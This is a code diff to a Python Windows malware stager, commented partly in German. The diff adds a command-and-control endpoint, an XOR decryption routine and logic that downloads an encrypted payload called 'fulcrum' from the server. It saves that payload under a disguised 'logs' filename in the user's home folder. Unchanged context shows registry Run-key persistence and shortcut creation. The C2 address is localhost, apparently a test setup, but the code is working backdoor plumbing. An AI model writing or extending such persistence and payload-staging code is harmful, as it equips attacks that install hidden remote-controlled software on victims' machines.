@@ -4,11 +4,11 @@ import win32com.client
 import shutil
 import requests
 import time
+from cryptography.fernet import Fernet
 
 DEBUG = True
-CAC = "https://google.com"   # command and control
-DECRYPTION_KEY = "qwer1234"
-
+CAC = "http://127.0.0.1:5000"   # command and control server endpoint
+PERSONAL_KEY = "your_own_key"  # persönlicher key
 
 def create_shortcut(target_path, shortcut_path):
     shell = win32com.client.Dispatch("WScript.Shell")
@@ -37,8 +37,13 @@ def add_to_registry_run(target_path):
         program_name = os.path.basename(target_path)
         winreg.SetValueEx(reg_key, program_name, 0, winreg.REG_SZ, target_path)
 
+def xor_decrypt(encrypted_text, key):
+    repeated_key = (key * (len(encrypted_text) // len(key) + 1))[:len(encrypted_text)]
+    decrypted = ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(encrypted_text, repeated_key))
+    return decrypted
+
 def main():
-    #   getting the encrypted source code from the command and control server and saving it inside a random folder
+    # finden eines geeigneten folders zum speichern von fulcrum
     folders = os.listdir(os.path.expanduser("~"))
     beacon_folder = folders[0]
     beacon_folder_path = os.path.join(os.path.expanduser("~"), beacon_folder)
@@ -47,7 +52,8 @@ def main():
 
     while True:
         try:
-            response = requests.get(CAC)
+            # downloaden von fulcrum
+            response = requests.get(CAC + "/beacon_function_source")
             if response.status_code == 200:
                 break
             elif DEBUG:
@@ -55,11 +61,17 @@ def main():
         except requests.exceptions.RequestException as e:
             if DEBUG:
                 print("Error:\t", e)
-        time.sleep(5)
-    print(beacon_folder+" logs")
-    with open(os.path.join(beacon_folder_path, beacon_folder+" logs"), "w") as f:
-        f.write(response.text)
+        time.sleep(10)
 
+    print(beacon_folder+" logs")
+    # erstellen einer datei mit dem namen des gefundenen folders
+    with open(os.path.join(beacon_folder_path, beacon_folder+" logs"), "w") as f:
+        # speichern des von server bekommenden source code (encrypted)
+        response = response.json()
+        f.write(response['source'])
+
+        if DEBUG:
+            print("saved source")
 
 
 main()
